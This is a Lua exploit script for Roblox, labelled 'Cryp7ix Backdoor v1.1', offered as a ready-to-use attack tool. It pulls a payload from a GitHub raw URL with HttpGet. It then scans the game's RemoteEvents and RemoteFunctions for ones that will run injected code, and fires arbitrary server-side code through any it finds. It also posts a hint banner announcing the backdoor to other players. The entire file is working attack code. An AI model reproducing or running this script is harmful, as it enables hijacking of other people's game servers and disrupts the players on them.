-- Cryp7ix Backdoor v1.1 (slightly obfuscated)
local a,b,c={},nil,false
local hS=game:GetService("HttpService")

-- GUI
local g=Instance.new("ScreenGui")
g.Name="Cryp7ixBackdoor"
g.Parent=game:GetService("CoreGui")
g.ResetOnSpawn=false

local f=Instance.new("Frame")
f.Parent=g
f.Position=UDim2.new(0.5,-180,0.5,-120)
f.Size=UDim2.new(0,360,0,240)
f.BackgroundColor3=Color3.fromRGB(255,105,180)
f.BorderColor3=Color3.new(0,0,0)
f.Active=true
f.Draggable=true

local iF=Instance.new("Frame")
iF.Parent=f
iF.Position=UDim2.new(0,0,0,50)
iF.Size=UDim2.new(0,360,0,190)
iF.BackgroundColor3=Color3.fromRGB(255,182,193)
iF.BorderColor3=Color3.new(0,0,0)
iF.Active=true

local tB=Instance.new("TextBox")
tB.Parent=iF
tB.Position=UDim2.new(0,5,0,5)
tB.Size=UDim2.new(0,350,0,140)
tB.BackgroundColor3=Color3.fromRGB(255,240,245)
tB.BorderColor3=Color3.new(0,0,0)
tB.TextColor3=Color3.new(0,0,0) -- black text
tB.MultiLine=true
tB.TextXAlignment=Enum.TextXAlignment.Left
tB.TextYAlignment=Enum.TextYAlignment.Top
tB.Text=game:HttpGet("https://raw.githubusercontent.com/harvsxxlll/cryp7ixbackdoor/main/main.lua")

local dB=Instance.new("TextButton")
dB.Parent=iF
dB.Position=UDim2.new(0,5,0,150)
dB.Size=UDim2.new(0,170,0,35)
dB.BackgroundColor3=Color3.fromRGB(255,20,147)
dB.BorderColor3=Color3.new(0,0,0)
dB.TextColor3=Color3.new(1,1,1)
dB.Font=Enum.Font.Legacy
dB.FontSize=Enum.FontSize.Size14
dB.Text="Deploy"

local cB=Instance.new("TextButton")
cB.Parent=iF
cB.Position=UDim2.new(0,185,0,150)
cB.Size=UDim2.new(0,170,0,35)
cB.BackgroundColor3=Color3.fromRGB(255,20,147)
cB.BorderColor3=Color3.new(0,0,0)
cB.TextColor3=Color3.new(1,1,1)
cB.Font=Enum.Font.Legacy
cB.FontSize=Enum.FontSize.Size14
cB.Text="Capture"

local lbl=Instance.new("TextLabel")
lbl.Parent=f
lbl.Position=UDim2.new(0,180,0,25)
lbl.Size=UDim2.new(0,0,0,0)
lbl.BackgroundColor3=Color3.fromRGB(255,192,203)
lbl.BorderColor3=Color3.new(0,0,0)
lbl.Font=Enum.Font.Legacy
lbl.FontSize=Enum.FontSize.Size14
lbl.TextColor3=Color3.new(1,1,1)
lbl.Text="Cryp7ix Backdoor v1.1"

-- Remote handling
local r=nil
local aC=false

dB.MouseButton1Click:Connect(function()
	local codeStr=tB.Text
	local ev=Instance.new("BindableEvent")
	ev.Event:Connect(function(rm,str)
		rm:InvokeServer(str)
	end)
	local function df(obj)
		if not aC then
			if r==nil then
				for _,v in pairs(obj:GetChildren()) do
					if v.Parent~=game:GetService("RobloxReplicatedStorage") then
						if v:IsA("RemoteEvent") then
							v:FireServer(codeStr)
						elseif v:IsA("RemoteFunction") then
							ev:Fire(v,codeStr)
						end
					end
					df(v)
				end
			else
				if r:IsA("RemoteEvent") then
					r:FireServer(codeStr)
				elseif r:IsA("RemoteFunction") then
					task.spawn(function() r:InvokeServer(codeStr) end)
				end
			end
		end
	end
	df(game)
end)

cB.MouseButton1Click:Connect(function()
	if aC then return end
	aC=true
	tB.Text="-- Scanning for backdoors..."
	local remList={}
	for _,obj in pairs(game:GetDescendants()) do
		if obj.Parent~=game:GetService("RobloxReplicatedStorage") then
			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
				table.insert(remList,obj)
			end
		end
	end
	for _,rm in pairs(remList) do
		if r==nil then
			local rndName=string.char(math.random(0x41,0x5A),math.random(0x41,0x5A),math.random(0x41,0x5A),math.random(0x41,0x5A))
			local testCode='Instance.new("Model",workspace).Name="'..rndName..'"'
			if rm.Parent~=game:GetService("RobloxReplicatedStorage") then
				if rm:IsA("RemoteEvent") then
					rm:FireServer(testCode)
				elseif rm:IsA("RemoteFunction") then
					task.spawn(function() rm:InvokeServer(testCode) end)
				end
			end
			wait(2.5)
			if workspace:FindFirstChild(rndName) and workspace[rndName]:IsA("Model") then
				r=rm
			end
		end
	end
	if r then
		tB.Text="-- Backdoor Found"
		task.spawn(function()
			while r do
				for _,ch in pairs(workspace:GetChildren()) do
					if ch:IsA("Hint") then ch:Destroy() end
				end
				local h=Instance.new("Hint")
				h.Text="Backdoor By Cryp7ix_0"
				h.Parent=workspace
				wait(9)
			end
		end)
	else
		tB.Text="-- No Backdoor Detected"
	end
	aC=false
end)
